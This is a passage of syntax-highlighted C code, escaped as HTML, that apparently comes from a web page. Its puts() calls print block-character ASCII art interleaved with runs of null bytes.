style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ 